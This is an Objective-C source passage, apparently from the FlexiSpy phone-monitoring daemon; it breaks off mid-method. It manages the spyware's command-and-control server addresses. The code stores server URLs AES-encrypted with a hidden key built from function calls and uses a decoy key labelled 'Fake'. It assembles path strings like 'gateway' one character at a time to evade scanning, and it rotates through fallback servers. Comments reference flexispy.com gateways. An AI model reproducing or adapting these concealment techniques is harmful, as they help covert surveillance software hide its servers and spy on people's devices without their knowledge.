//
//  ServerAddressManagerImp.m
//  Source-ServerAddressManager
//
//  Created by Dominique  Mayrand on 11/22/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "ServerAddressManagerImp.h"
#import "ServerAddressChangeDelegate.h"
#import "NSDATA-AES.h"
#import "AESCryptor.h"
#import "DaemonPrivateHome.h"
#import "AutomateAESKeyURL.h"

#define SERVER_PATH			@"fse.bin"
#define SERVER_PATH_REQU	@"fse-r.bin"

//static char key[] = {4,5,21,22,1,5,10,3,2,56,126,10,14,14,14,9 };

// key to decrypt urls
static const char kKey[] = {10, 0, 23, 7, 31, 13, 1, 12, 9, 16, 19, 7, 11, 21, 29, 18};

// -- retrieved from file ServerUrl.h
// These five variables store each of encrypted url as follows:
//		www.apple.com
//		www.google.com
//		www.gmail.com
//		www.hotmail.com
//		www.yahoo.com
unsigned char url01[] = {0xfc,0x94,0x88,0x48,0x5f,0xa4,0x9a,0xfb,0x6e,0xf8,0xcd,0x1,0x47,0x64,0x3,0xd0,0x1f,0xb8,0xa3,0x85,0x84,0xa9,0x4a,0xc4,0x9e,0xea,0x26,0x9,0x62,0x96,0x91,0xa6};
unsigned char url02[] = {0xa9,0xc5,0x9a,0xb3,0x9,0x38,0x15,0xb3,0x22,0xb3,0x7,0x21,0x3e,0x39,0x35,0xc6,0x69,0x6e,0xf3,0x64,0xb0,0xa,0x4c,0xcb,0x77,0xff,0x76,0x3c,0x37,0xf3,0x99,0x96};
unsigned char url03[] = {0x24,0x4d,0xc0,0x45,0xe0,0x50,0x1f,0x72,0xf,0xb0,0xcc,0xb9,0xc6,0x72,0xa9,0x5a,0xf3,0x5a,0xd9,0xe2,0xc3,0x44,0xd9,0x25,0xf3,0x12,0x6a,0xc,0x37,0x6a,0x3f,0xb6};
unsigned char url04[] = {0xd3,0x91,0x98,0xfd,0xcd,0x6e,0x1,0x44,0xfc,0xf7,0x5d,0x8,0xab,0xbc,0x43,0xab,0xd3,0x4a,0xd9,0x7,0xa7,0x8e,0xda,0xba,0xb5,0x8a,0x27,0xe1,0xc6,0x7a,0xfe,0xee};
unsigned char url05[] = {0x27,0x3b,0x57,0xcb,0xf4,0x27,0xc4,0xb4,0xfb,0x8b,0xe,0xfe,0x83,0x3,0x48,0x24,0xab,0x9c,0x32,0xfa,0x23,0x27,0x3f,0x9d,0xf9,0xd0,0x65,0x80,0x21,0xe8,0x8e,0xbc};

// -- retrieved from file ServerUrlTwoDimention.h
// This 2 dimentional array stores 6 encrypted urls
//		www.apple.com
//		www.google.com
//		www.gmail.com
//		www.hotmail.com
//		www.yahoo.com
//		www.something/something/something.com
unsigned char url[][48] = {
	{0xfc,0x94,0x88,0x48,0x5f,0xa4,0x9a,0xfb,0x6e,0xf8,0xcd,0x1,0x47,0x64,0x3,0xd0,0x1f,0xb8,0xa3,0x85,0x84,0xa9,0x4a,0xc4,0x9e,0xea,0x26,0x9,0x62,0x96,0x91,0xa6},
	{0xa9,0xc5,0x9a,0xb3,0x9,0x38,0x15,0xb3,0x22,0xb3,0x7,0x21,0x3e,0x39,0x35,0xc6,0x69,0x6e,0xf3,0x64,0xb0,0xa,0x4c,0xcb,0x77,0xff,0x76,0x3c,0x37,0xf3,0x99,0x96},
	{0x24,0x4d,0xc0,0x45,0xe0,0x50,0x1f,0x72,0xf,0xb0,0xcc,0xb9,0xc6,0x72,0xa9,0x5a,0xf3,0x5a,0xd9,0xe2,0xc3,0x44,0xd9,0x25,0xf3,0x12,0x6a,0xc,0x37,0x6a,0x3f,0xb6},
	{0xd3,0x91,0x98,0xfd,0xcd,0x6e,0x1,0x44,0xfc,0xf7,0x5d,0x8,0xab,0xbc,0x43,0xab,0xd3,0x4a,0xd9,0x7,0xa7,0x8e,0xda,0xba,0xb5,0x8a,0x27,0xe1,0xc6,0x7a,0xfe,0xee},
	{0x27,0x3b,0x57,0xcb,0xf4,0x27,0xc4,0xb4,0xfb,0x8b,0xe,0xfe,0x83,0x3,0x48,0x24,0xab,0x9c,0x32,0xfa,0x23,0x27,0x3f,0x9d,0xf9,0xd0,0x65,0x80,0x21,0xe8,0x8e,0xbc},
	{0xfe,0x68,0xd9,0xe2,0xdd,0xea,0x9e,0xa3,0x28,0x3,0xb0,0xc8,0xb5,0xba,0x70,0xd5,0x5d,0x8d,0x51,0x2e,0xdc,0xc0,0x29,0xb5,0xe4,0x4f,0x29,0x87,0x4,0xaf,0x7d,0xc1,0xbd,0xf8,0x1f,0xe3,0xf7,0xac,0xf1,0x8,0xac,0xee,0x5f,0xb1,0xd7,0xa6,0x61,0x64}
};

#pragma mark -
#pragma mark Sign up urls cipher
#pragma mark -

// Test server
// http://mobilesignuptest.wefeelsecure.com/admin/simplesignup
unsigned char kSignUpTestServer[] = {0x5,0x27,0xe0,0xe3,0xda,0xc0,0x85,0x67,0x9a,0xff,0xb5,0x64,0xac,0x2d,0xa7,0xea,0x44,0x83,0x38,0xbf,0xa6,0x3e,0x46,0x79,0xad,0x1c,0x52,0xa4,
									 0xf5,0x6b,0x3c,0x44,0x6c,0xdb,0xdb,0x98,0x94,0x4f,0x62,0x9c,0xac,0x4e,0x28,0x6e,0xd4,0xb2,0xda,0x9e,0x24,0x2e,0xc3,0x8b,0xab,0x7f,0xe2,0xad,
									 0xef,0xcd,0x25,0x6f,0x32,0x2d,0x91,0xb4};
// http://mobilesignup.wefeelsecure.com/admin/simplesignup
unsigned char kSignUpProductionServer[] = {0x9e,0x1d,0x25,0xf7,0x2d,0xf9,0x8c,0x6f,0xf0,0x91,0x8f,0x10,0x49,0xf9,0x51,0x2b,0xe2,0x29,0x5a,0xa1,0x7b,0xc6,0xe5,0x42,0x90,0x9c,0xe4,0x16,
											0xd2,0xd2,0x69,0x17,0x5f,0x45,0x5f,0x15,0xd0,0xe7,0xf0,0xc5,0x7b,0xac,0xcf,0x7e,0xa6,0x7a,0x1,0x73,0xcb,0xde,0x84,0x8b,0xb6,0xde,0x84,0x4f,
											0x7,0x6d,0xa3,0xe8,0xa8,0xda,0xcd,0xe0};


// -- retrieved from file ServerUrlTwoDimentionSize.h
// urlSize store size of each url correspondding to 2 dimentional array 'url' declared previously
NSInteger urlSize[] = {32,32,32,32,32,48};

@interface ServerAddressManagerImp(private)
-(NSString*) getGateWay;
-(NSString*) getUnstructured;
-(NSString*) getBase;
-(NSString*) getFilePath;
-(void) doSetBaseServerUrl:(NSString*) aUrl;

// Base url decryption (header)
- (void) decryptURLsAndAddToArray;
- (void) decryptTwoDimentionalURLArrayAndAddToArray;	// This method required two dimentional array name 'url'
														// and an array 'urlSize' to be declared
- (NSData *) decryptData: (NSData *) aUrlAndLengthData;
- (NSString *) stringFromURLData: (NSData *) aDecryptedData;
- (NSData *) decryptBaseURL: (NSData *) aBaseURLData;

// User Url Util
- (NSData *) toData: (NSArray *) aUrlArray;
- (NSData *) encrypt: (NSData *) aUrlAndLengthData;
- (void) readBaseURLsFromHeader;
- (NSString *) readBaseURLFromServerPath;
- (void) combineArrayForSearch: (NSArray *) aUrls;
- (void) printTotalArrayAndAllIndexes;
- (NSMutableArray *) transferDataToArray: (NSData *) aData;
@end

@implementation ServerAddressManagerImp

@synthesize mIsRequiredBaseServer;
@synthesize mCurrentIndex;
@synthesize mStartIndex;

-(id) init
{
	self = [super init];
	if(self)
	{
		// In IOS 6. encryption with wrong key cause application parse the garbage from encryption API which lead to application crash
//		[self readBaseURLsFromHeader];
		
		NSString *stringBasedURL = [NSString stringWithString:[self readBaseURLFromServerPath]];

		if (mTotalUrlArray) {
			[mTotalUrlArray release];
		}
		
		// Search base url in url array to identify the index of current url
		if ([mDefinedUrlArray containsObject:stringBasedURL]) {
			NSInteger index = [mDefinedUrlArray indexOfObject:stringBasedURL];
			mCurrentIndex = mStartIndex = (index + 1);
			
			// create new array storing all urls
			mTotalUrlArray = [[NSArray alloc] initWithArray:mDefinedUrlArray];		
		} else {
			[mDefinedUrlArray addObject:stringBasedURL];
			mCurrentIndex = mStartIndex = [mDefinedUrlArray count];
			DLog(@"base url is not in the url list");
			mTotalUrlArray = [[NSArray alloc] initWithArray:mDefinedUrlArray];
		}
		[self printTotalArrayAndAllIndexes];
		//[stringBasedURL release];
	}
	return self;
}

- (id) initWithServerAddressChangeDelegate: (id <ServerAddressChangeDelegate>) aServerAddressChangeDelegate {
	if ((self = [self init])) {
		mDelegate = aServerAddressChangeDelegate;
		[mDelegate retain];
	}
	return (self);
}


#pragma mark -
#pragma mark Base URL Decryption (Header)
#pragma mark -

/**
 - Method name: decryptURLsAndAddToArray
 - Purpose: Decrypt urls that was declared at the beginning of this class.
	Note that either this method or the method decryptTwoDimentionalURLArrayAndAddToArray is called to 
	decrypt the urls depending on the forms of url used (many one-dimentional arrays or one two-dimentional array)
 - Argument list and description: No argument
 - Return description: No return
 */
- (void) decryptURLsAndAddToArray {
	if (!mDefinedUrlArray) {
		mDefinedUrlArray = [[NSMutableArray alloc] init];
	} else {
		[mDefinedUrlArray removeAllObjects];
	}
	
	// Obsolete
	NSData *urlAndLengthData = [NSData dataWithBytes:url01 length:(sizeof(url01)/sizeof(unsigned char))];
	NSData *decryptedData = [self decryptData:urlAndLengthData];
	//DLog(@"decrypted data %@", decryptedData);
	NSString *urlString = [self stringFromURLData:decryptedData];
	//DLog(@"URL string: %@", urlString);
	[mDefinedUrlArray addObject:urlString];
	
	urlAndLengthData = [NSData dataWithBytes:url02 length:(sizeof(url02)/sizeof(unsigned char))];
	decryptedData =  [self decryptData:urlAndLengthData];
	//DLog(@"decrypted data %@", decryptedData);
	urlString = [self stringFromURLData:decryptedData];
	//DLog(@"URL string: %@", urlString);
	[mDefinedUrlArray addObject:urlString];
	
	urlAndLengthData = [NSData dataWithBytes:url03 length:(sizeof(url03)/sizeof(unsigned char))];
	decryptedData = [self decryptData:urlAndLengthData];
	//DLog(@"decrypted data %@", decryptedData);
	urlString = [self stringFromURLData:decryptedData];
	//DLog(@"URL string: %@", urlString); 
	[mDefinedUrlArray addObject:urlString];
	
	urlAndLengthData = [NSData dataWithBytes:url04 length:(sizeof(url04)/sizeof(unsigned char))];
	decryptedData = [self decryptData:urlAndLengthData];
	//DLog(@"decrypted data %@", decryptedData);
	urlString = [self stringFromURLData:decryptedData];
	//DLog(@"URL string: %@", urlString); 
	[mDefinedUrlArray addObject:urlString];
	
	urlAndLengthData = [NSData dataWithBytes:url05 length:(sizeof(url05)/sizeof(unsigned char))];
	decryptedData = [self decryptData:urlAndLengthData];
	//DLog(@"decrypted data %@", decryptedData);
	urlString = [self stringFromURLData:decryptedData];
	//DLog(@"URL string: %@", urlString); 
	[mDefinedUrlArray addObject:urlString];
	
	//DLog(@"size of url array %d", [mDefinedUrlArray count]);
}

/**
 - Method name: decryptTwoDimentionalURLArrayAndAddToArray
 - Purpose: Decrypt 2 dimentional array called url that was declared at the beginning of this class.
	Note that either this method or the method decryptURLsAndAddToArray is called to decrypt the urls
	depending on the forms of url used (many one-dimentional arrays or one two-dimentional array)
 - Argument list and description: No argument
 - Return description: No return
 */
- (void) decryptTwoDimentionalURLArrayAndAddToArray {
	if (!mDefinedUrlArray) {
		mDefinedUrlArray = [[NSMutableArray alloc] init];
	} else {
		[mDefinedUrlArray removeAllObjects];
	}
	
	// Obsolete
	for (int i = 0; i < (sizeof(url)/sizeof(url[0])); i++) {
		//DLog (@"decryptTwoDimentionalURLArrayAndAddToArray --%d--", i);
		NSData *urlAndLengthData = [NSData dataWithBytes:url[i] length:(urlSize[i])];
		//DLog (@"decryptTwoDimentionalURLArrayAndAddToArray, urlAndLengthData = %@", urlAndLengthData);
		
		//IOS 6.0, 3GS, even key is different still get data back
		
		NSData *decryptedData = [self decryptData:urlAndLengthData];
		//DLog (@"decryptTwoDimentionalURLArrayAndAddToArray, decryptedData = %@", decryptedData);
		NSString *urlString = [self stringFromURLData:decryptedData];
		DLog(@"URL string %d: %@", i+1, urlString); 
		[mDefinedUrlArray addObject:urlString];	
	}
}

- (NSData *) decryptData: (NSData *) aUrlAndLengthData {
	AESCryptor *cryptor = [[AESCryptor alloc] init];
	// Fake
	NSString *key = [[NSString alloc] initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSUTF8StringEncoding];
	
	char urlKey[16];
	urlKey[0] = url0();
	urlKey[1] = url1();
	urlKey[2] = url2();
	urlKey[3] = url3();
	urlKey[4] = url4();
	urlKey[5] = url5();
	urlKey[6] = url6();
	urlKey[7] = url7();
	urlKey[8] = url8();
	urlKey[9] = url9();
	urlKey[10] = url10();
	urlKey[11] = url11();
	urlKey[12] = url12();
	urlKey[13] = url13();
	urlKey[14] = url14();
	urlKey[15] = url15();
	
	// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//	NSString *aesKey = [[[NSString alloc] initWithBytes:urlKey
//												 length:16
//											   encoding:NSUTF8StringEncoding] autorelease];
	
	NSData *aesKey = [NSData dataWithBytes:urlKey length:16];
	
	// Obsolete
//	NSData *decryptedData = [[cryptor decrypt:aUrlAndLengthData withKey:aesKey] retain];
	
	NSData *decryptedData = [[cryptor decryptv2:aUrlAndLengthData withKey:aesKey] retain];
	[cryptor release];
	[key release];
	return [decryptedData autorelease];
}

- (NSString *) stringFromURLData: (NSData *) aDecryptedData {
	DLog(@"stringFromURLData, aDecryptedData = %@", aDecryptedData);
	NSInteger sizeOfUrl = 0;
	[aDecryptedData getBytes:&sizeOfUrl length:sizeof(NSInteger)];
	
	NSRange range = NSMakeRange(sizeof(NSInteger), sizeOfUrl);
	NSData *urlData = [aDecryptedData subdataWithRange:range];
	
	NSString *urlString = [[NSString alloc] initWithData:urlData encoding:NSUTF8StringEncoding];
	return [urlString autorelease];
}

- (NSData *) decryptBaseURL: (NSData *) aBaseURLData {
	AESCryptor *cryptor = [[AESCryptor alloc] init];
	// Fake
	NSString *aKey = [[NSString alloc] initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSUTF8StringEncoding];
	
	char urlKey[16];
	urlKey[0] = url0();
	urlKey[1] = url1();
	urlKey[2] = url2();
	urlKey[3] = url3();
	urlKey[4] = url4();
	urlKey[5] = url5();
	urlKey[6] = url6();
	urlKey[7] = url7();
	urlKey[8] = url8();
	urlKey[9] = url9();
	urlKey[10] = url10();
	urlKey[11] = url11();
	urlKey[12] = url12();
	urlKey[13] = url13();
	urlKey[14] = url14();
	urlKey[15] = url15();
	
	// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//	NSString *aesKey = [[[NSString alloc] initWithBytes:urlKey
//												 length:16
//											   encoding:NSUTF8StringEncoding] autorelease];
	
	NSData *aesKey = [NSData dataWithBytes:urlKey length:16];
	
	// Obsolete
//	NSData *decryptedData = [[cryptor decrypt:aBaseURLData withKey:aesKey] retain];
	
	NSData *decryptedData = [[cryptor decryptv2:aBaseURLData withKey:aesKey] retain];
	[cryptor release];
	[aKey release];
	return [decryptedData autorelease];
}

-(NSString*) getFilePath {
	NSString *path = [NSString stringWithFormat:@"%@servaddr/", [DaemonPrivateHome daemonPrivateHome]];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:path];
	return path;
}

#define REQUIRED_SPACE 1

-(void) setBaseServerUrl:(NSString*) aUrl {
	[self doSetBaseServerUrl:aUrl];
	if ([mDelegate respondsToSelector:@selector(serverAddressChanged)]) {
		[mDelegate serverAddressChanged];
	}
}

- (void) setBaseServerCipherUrl: (NSData *) aCipherUrl {
	DLog (@"Server base cipher, aCipherUrl = %@", aCipherUrl);
	
	// Due to legacy thing: method to read url from not store data in form of [length] + [raw data]
	// thus we need to decrypt cipher url then convert to string after that use setBaseServerUrl method
	// to reuse legacy implementation
	NSData *urlData = [self decryptData:aCipherUrl];
	DLog (@"Server base plain, urlData = %@", urlData);
	
	NSString *url = [self stringFromURLData:urlData]; // auto release
	DLog (@"Server url, url = %@", url);
	
	NSString *path = [self getFilePath];
	path = [path stringByAppendingString:SERVER_PATH];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if (![fileManager fileExistsAtPath:path]) {
		[self setBaseServerUrl:url];
	} else {
		if ([mDelegate respondsToSelector:@selector(serverAddressChanged)]) {
			[mDelegate serverAddressChanged];
		}	
	}
}

-(void) doSetBaseServerUrl:(NSString*) aUrl {
	if(aUrl) {
		AESCryptor* cryptor = [[AESCryptor alloc] init];
		if(cryptor){
			NSData* data = [aUrl dataUsingEncoding:NSUTF8StringEncoding];
			DLog(@"data before write to file = %@", data);
			if(data){
				// Fake
				//NSString* keystring = [[NSString alloc]initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSASCIIStringEncoding];
				NSString* keystring = [[NSString alloc]initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSUTF8StringEncoding];
				
				char urlKey[16];
				urlKey[0] = url0();
				urlKey[1] = url1();
				urlKey[2] = url2();
				urlKey[3] = url3();
				urlKey[4] = url4();
				urlKey[5] = url5();
				urlKey[6] = url6();
				urlKey[7] = url7();
				urlKey[8] = url8();
				urlKey[9] = url9();
				urlKey[10] = url10();
				urlKey[11] = url11();
				urlKey[12] = url12();
				urlKey[13] = url13();
				urlKey[14] = url14();
				urlKey[15] = url15();
				
				// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//				NSString *aesKey = [[[NSString alloc] initWithBytes:urlKey
//															 length:16
//														   encoding:NSUTF8StringEncoding] autorelease];
				
				NSData *aesKey = [NSData dataWithBytes:urlKey length:16];
				
				// Obsolete
//				NSData* encryptedData = [cryptor encrypt:data withKey:aesKey];
				
				NSData *encryptedData = [cryptor encryptv2:data withKey:aesKey];
				if(encryptedData){
					NSString *path = [self getFilePath];
					path = [path stringByAppendingString:SERVER_PATH];
					BOOL res = [encryptedData writeToFile:path atomically:YES];
					if(res == NO)
					{
						DLog(@"Could not save to file");
					}
				}
				[keystring release];
			}
		}
		[cryptor release];
	}	
}

-(void) setRequireBaseServerUrl:(bool) aRequired{
	[self setMIsRequiredBaseServer:aRequired];
}

-(NSString*) getHostServerUrl {
	NSString *baseServer = @"";
	if([self mIsRequiredBaseServer]){
		baseServer = [self getStructuredServerUrl];
	}
	DLog (@"Host url that need to send via protocl = %@", baseServer);
	return baseServer;
}

-(NSString*) getStructuredServerUrl{
	NSString* url = nil;
	NSString* base = [self getBase];
	if(base) {
		url = [[NSString alloc]  initWithFormat:@"%@/%@",base, [self getGateWay]];
		[url autorelease];
	}
	DLog (@"Structure url = %@", url);
	return url;
	//return (@"http://dev-mobile.flexispy.com/gateway");
	//return (@"http://svr-csmobile.flexispy.com/gateway");
}

-(NSString*) getUnstructuredServerUrl{
	NSString* url = nil;
	NSString* base = [self getBase];
	if(base){
		url = [[NSString alloc] initWithFormat:@"%@/%@/%@",base, [self getGateWay], [self getUnstructured]];
	}
	if(url) [url autorelease];
	
	return url;
	//return (@"http://dev-mobile.flexispy.com/gateway/unstructured");
	//return (@"http://svr-csmobile.flexispy.com/gateway/unstructured");
}

-(NSString*) getGateWay{
	//gateway
	NSString* info = [[[NSString alloc] initWithString:@"g"]autorelease];
	info = [info stringByAppendingString:@"a"];
	info = [info stringByAppendingString:@"t"];
	info = [info stringByAppendingString:@"e"];
	info = [info stringByAppendingString:@"w"];
	info = [info stringByAppendingString:@"a"];
	info = [info stringByAppendingString:@"y"];
	return info;
}

-(NSString*) getUnstructured{
	//unstructured
	NSString* info = [[[NSString alloc] initWithString:@"u"] autorelease];
	info = [info stringByAppendingString:@"n"];
	info = [info stringByAppendingString:@"s"];
	info = [info stringByAppendingString:@"t"];
	info = [info stringByAppendingString:@"r"];
	info = [info stringByAppendingString:@"u"];
	info = [info stringByAppendingString:@"c"];
	info = [info stringByAppendingString:@"t"];
	info = [info stringByAppendingString:@"u"];
	info = [info stringByAppendingString:@"r"];
	info = [info stringByAppendingString:@"e"];
	info = [info stringByAppendingString:@"d"];
	return info;
}

- (BOOL) verifyURL: (NSString *) aUrl {
	//NSString *urlRegEx =@"(http|https)://((\\w)*|([0-9]*)|([-|_])*)+([\\.|/]((\\w)*|([0-9]*)|([-|_])*))+";
	NSString *urlRegEx =@"((mailto\\:|(news|(ht|f)tp(s?))\\://){1}\\S+)";
	NSPredicate *urlCheck = [NSPredicate predicateWithFormat:@"SELF MATCHES %@", urlRegEx]; 
	return [urlCheck evaluateWithObject:aUrl];
}

- (BOOL) hasNextURL {
 	NSInteger lastIndex = [mTotalUrlArray count];
	DLog(@"last index %d", lastIndex);
	BOOL hasNext = FALSE;
	if (mStartIndex == 1) {								// start index is the first index (1)
		if (mCurrentIndex < lastIndex) {
			mCurrentIndex++;
			DLog(@"start index %d", mStartIndex);
			DLog(@"current index %d", mCurrentIndex);
			hasNext = TRUE;
		} else if (mCurrentIndex == lastIndex) {
			DLog(@"start index %d", mStartIndex);
			DLog(@"current index %d", mCurrentIndex);
			hasNext = FALSE;
		}
	} else if (mStartIndex == lastIndex) {				// start index is the last index (equal to the size of array)
		if (mCurrentIndex == lastIndex) { 
			mCurrentIndex = 1;
			DLog(@"start index %d", mStartIndex);
			DLog(@"current index %d", mCurrentIndex);
			hasNext = TRUE;
		} else if (mCurrentIndex < lastIndex) {
			if (mCurrentIndex == (lastIndex - 1)) {
				DLog(@"start index %d", mStartIndex);
				DLog(@"current index %d", mCurrentIndex);
				hasNext = FALSE;
			} else {
				mCurrentIndex++;
				DLog(@"start index %d", mStartIndex);
				DLog(@"current index %d", mCurrentIndex);
				hasNext = TRUE;
			}
		}
	} else {											// start index is at bottom
		if (mCurrentIndex < mStartIndex) {
			if (mCurrentIndex == (mStartIndex - 1)) {
				DLog(@"start index %d", mStartIndex);
				DLog(@"current index %d", mCurrentIndex);
				hasNext = FALSE;
			} else {
				mCurrentIndex++;
				DLog(@"start index %d", mStartIndex);
				DLog(@"current index %d", mCurrentIndex);
				hasNext = TRUE;
			}
		} else {
			if (mCurrentIndex == lastIndex) {
				mCurrentIndex = 1;
			} else {
				mCurrentIndex++;
			}
			DLog(@"start index %d", mStartIndex);
			DLog(@"current index %d", mCurrentIndex);
			hasNext = TRUE;
		}
	}
	return hasNext;
}


#pragma mark -
#pragma mark User URL
#pragma mark -

- (void) addUserURLs: (NSArray *) aUrls {
	NSData *urlsData = [self toData:aUrls];
	NSData *encryptedUrlsData = [self encrypt:urlsData];
	
	// write it to file
	NSString *path = [self getFilePath];
	path = [path stringByAppendingString:SERVER_PATH_REQU];
	[encryptedUrlsData writeToFile:path atomically:NO];
	
	// recalculate mCurrentindex and mStartindex
	[self readBaseURLsFromHeader];
	NSString *stringBasedURL = [NSString stringWithString:[self readBaseURLFromServerPath]];

	[self combineArrayForSearch:aUrls];
	
	if (mTotalUrlArray) {
		[mTotalUrlArray release];
	}
	
	// Search base url in url array to identify the index of current url
	if ([mDefinedUrlArray containsObject:stringBasedURL]) {
		NSInteger index = [mDefinedUrlArray indexOfObject:stringBasedURL];
		mCurrentIndex = mStartIndex = (index + 1);
		
		// create new array storing all urls
		mTotalUrlArray = [[NSArray alloc] initWithArray:mDefinedUrlArray];		
	} else {
		[mDefinedUrlArray addObject:stringBasedURL];
		mCurrentIndex = mStartIndex = [mDefinedUrlArray count];
		DLog(@"base url is not in the url list");
		mTotalUrlArray = [[NSArray alloc] initWithArray:mDefinedUrlArray];
	}

	[self printTotalArrayAndAllIndexes];
}

// delete file storing user url
- (void) clearUserURLs {

	NSString *path = [self getFilePath];
	path = [path stringByAppendingString:SERVER_PATH_REQU];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:path]) {
		[fileManager removeItemAtPath:path error:nil];
	} else {
		DLog(@"File doesn't exist");
	}

	// recalculate mCurrentindex and mStartindex
	[self readBaseURLsFromHeader];
	NSString *stringBasedURL = [NSString stringWithString:[self readBaseURLFromServerPath]];
	
	if (mTotalUrlArray) {
		[mTotalUrlArray release];
	}
	
	// Search base url in url array to identify the index of current url
	if ([mDefinedUrlArray containsObject:stringBasedURL]) {
		NSInteger index = [mDefinedUrlArray indexOfObject:stringBasedURL];
		mCurrentIndex = mStartIndex = (index + 1);
		
		// create new array storing all urls
		mTotalUrlArray = [[NSArray alloc] initWithArray:mDefinedUrlArray];		
	} else {
		[mDefinedUrlArray addObject:stringBasedURL];
		mCurrentIndex = mStartIndex = [mDefinedUrlArray count];
		DLog(@"base url is not in the url list");
		mTotalUrlArray = [[NSArray alloc] initWithArray:mDefinedUrlArray];
	}
	[self printTotalArrayAndAllIndexes];
}

- (NSArray* ) userURLs {
	// read file that stores user URLs
	NSString *path = [self getFilePath];
	path = [path stringByAppendingString:SERVER_PATH_REQU];
	NSData *encryptedUrlsData = [NSData dataWithContentsOfFile:path];
	// decrypt urls data
	NSData *urlsData = [self decryptData:encryptedUrlsData];
	NSMutableArray *data = [[self transferDataToArray:urlsData] retain];
	return [data autorelease];
}

#pragma mark -
#pragma mark Sign up url
#pragma mark -

- (NSString *) signUpUrl {
	NSData *signUpUrlCipherData = [NSData dataWithBytes:kSignUpTestServer length:sizeof(kSignUpTestServer)/sizeof(unsigned char)];	
	NSData *signUpUrlPlainData = [self decryptData:signUpUrlCipherData];
	NSString *signUpUrlString = [self stringFromURLData:signUpUrlPlainData];
	DLog (@"Sign up url = %@", signUpUrlString);
	return (signUpUrlString);
}

#pragma mark -
#pragma mark User URL Util
#pragma mark -

- (NSData *) toData: (NSArray *) aUrlArray {
	NSMutableData* data = [[NSMutableData alloc] init];
	
	// append a number of array elements, size of each element and each element to the data
	NSInteger numberOfElements = [aUrlArray count];
	[data appendBytes:&numberOfElements length:sizeof(NSInteger)];			
	
	// append the size of each element and element itself
	for (NSString *anElement in aUrlArray) {
		NSInteger sizeOfAnElement = [anElement lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
		[data appendBytes:&sizeOfAnElement length:sizeof(NSInteger)];			
		
		NSData *elementData = [anElement dataUsingEncoding:NSUTF8StringEncoding];
		[data appendData:elementData];											
	}
	[data autorelease];
	return data;
}

- (NSData *) encrypt: (NSData *) aUrlAndLengthData {
	AESCryptor *cryptor = [[AESCryptor alloc] init];
	// Fake
	NSString *key = [[NSString alloc] initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSUTF8StringEncoding];
	
	char urlKey[16];
	urlKey[0] = url0();
	urlKey[1] = url1();
	urlKey[2] = url2();
	urlKey[3] = url3();
	urlKey[4] = url4();
	urlKey[5] = url5();
	urlKey[6] = url6();
	urlKey[7] = url7();
	urlKey[8] = url8();
	urlKey[9] = url9();
	urlKey[10] = url10();
	urlKey[11] = url11();
	urlKey[12] = url12();
	urlKey[13] = url13();
	urlKey[14] = url14();
	urlKey[15] = url15();
	
	// Bad thing is that aesKey could be nil (unpredictable depend on auto-generate keys)
//	NSString *aesKey = [[[NSString alloc] initWithBytes:urlKey
//												 length:16
//											   encoding:NSUTF8StringEncoding] autorelease];
	
	NSData *aesKey = [NSData dataWithBytes:urlKey length:16];
	
	// Obsolete
//	NSData* encryptedData = [cryptor encrypt:aUrlAndLengthData withKey:aesKey];
	
	NSData *encryptedData = [[cryptor encryptv2:aUrlAndLengthData withKey:aesKey] retain];
	
	[cryptor release];
	[key release];
	return	[encryptedData autorelease];
}

- (void) readBaseURLsFromHeader {
	[self decryptTwoDimentionalURLArrayAndAddToArray];
	DLog(@"array url: %@", mDefinedUrlArray);
}
	
- (NSString *) readBaseURLFromServerPath {
	// Read base url from fse.bin
	NSString *path = [self getFilePath];
	path = [path stringByAppendingString:SERVER_PATH];
	
	NSData *baseURLData = [NSData dataWithContentsOfFile:path];
	NSData *decryptedBasedURLData = [self decryptBaseURL:baseURLData];
	NSString *stringBasedURL = [[NSString alloc] initWithData:decryptedBasedURLData encoding:NSUTF8StringEncoding];
	DLog(@"string url = %@", stringBasedURL);
	return [stringBasedURL autorelease];
}

- (void) combineArrayForSearch: (NSArray *) aUrls {
	// add user URLs to mDefinedUrlArray array
	[mDefinedUrlArray addObjectsFromArray:aUrls];
	DLog(@"NEW mDefniedUrlArray %@", mDefinedUrlArray);
}

- (void) printTotalArrayAndAllIndexes {
	DLog(@"total array %@", mTotalUrlArray);
	DLog(@"--- current index is %u", mCurrentIndex);
	DLog(@"--- start index is %u", mStartIndex);
}

- (NSMutableArray *) transferDataToArray: (NSData *) aData {
	DLog (@"transferDataToArray, aData = %@", aData);
	// get a number of elements in array
	NSInteger numberOfElements = 0;
	[aData getBytes:&numberOfElements length:sizeof(NSInteger)];		
	NSInteger location = sizeof(NSInteger);	
		
	NSMutableArray *array = [[NSMutableArray alloc] init];
	for (int i = 0; i < numberOfElements; i++) {
		NSRange range = NSMakeRange(location, sizeof(NSInteger));		
		NSInteger sizeOfAnElement;
		[aData getBytes:&sizeOfAnElement range:range];				
		location += sizeof(NSInteger);
		
		range = NSMakeRange(location, sizeOfAnElement);
		NSData *elementData = [aData subdataWithRange:range];		
		NSString *elementString = [[NSString alloc] initWithData:elementData encoding:NSUTF8StringEncoding];
		location += sizeOfAnElement;
		
		[array addObject:elementString];
		[elementString release];
	}
	return [array autorelease];
}

-(NSString*) getBase {
	NSString* baseUrl = nil;
	NSString *path = [self getFilePath];
	path = [path stringByAppendingString:SERVER_PATH];
	NSData* data = [NSData dataWithContentsOfFile:path];
	DLog (@"Server base cipher, data = %@", data);
	if(data){
		AESCryptor* crypt = [[AESCryptor alloc] init];
		if(crypt){
			// Fake
			//NSString* keystring = [[NSString alloc]initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSASCIIStringEncoding];
			NSString* keystring = [[NSString alloc]initWithBytes:kKey length:sizeof(kKey)/sizeof(unsigned char) encoding:NSUTF8StringEncoding];
			DLog (@"Server base cipher key = %@, length = %d", keystring, [keystring length]);
			
			char urlKey[16];
			urlKey[0] = url0();
